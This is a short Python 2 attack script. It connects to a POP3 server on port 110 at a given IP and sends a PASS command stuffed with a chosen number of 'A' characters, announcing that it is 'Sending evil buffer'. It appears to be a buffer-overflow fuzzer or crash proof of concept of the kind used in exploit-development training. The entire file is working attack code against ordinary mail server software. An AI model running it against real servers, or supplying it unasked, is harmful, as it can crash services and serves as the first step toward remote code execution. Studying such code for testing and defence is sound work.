
#!/usr/bin/python
import socket
import sys

if len(sys.argv) != 3:
    print "\n[*] Usage: " + sys.argv[0] + " <ip_address> <payload_length>\n"
    sys.exit(0)

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
buffer='A' * int(sys.argv[2])

try:
    print "\nSending evil buffer..."
    s.connect((sys.argv[1], 110))
    data=s.recv(1024)
    s.send('USER username\r\n')
    data=s.recv(1024)
    s.send('PASS ' + buffer + '\r\n')
    print "\nDone!"
except:
    print "Could not connect to POP3 on " + sys.argv[1]
